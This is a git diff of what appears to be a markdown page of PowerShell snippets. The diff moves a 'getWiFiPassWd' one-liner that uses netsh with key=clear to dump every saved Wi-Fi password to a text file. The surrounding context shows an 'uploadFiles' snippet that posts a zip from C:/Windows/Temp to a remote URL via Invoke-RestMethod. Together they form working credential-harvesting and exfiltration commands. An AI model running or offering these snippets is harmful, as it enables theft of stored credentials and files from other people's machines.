@@ -7,6 +7,14 @@ categories: powershell
 ---
 ``` powershell
 
+## getWiFiPassWd
+
+$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);
+$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" >> passwd.txt}
+type passwd.txt
+
+
+
 ## uploadFiles
 
 $FilePath="C:/Windows/Temp/files.zip"
@@ -20,10 +28,6 @@ $bodyLines=("--$boundary","Content-Disposition: form-data; name=`"uploads`"; fil
 Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
 
 
-## getWiFiPassWd
-
-$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);
-$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" >> $FilePath}
 
 ## downloadFiles
 
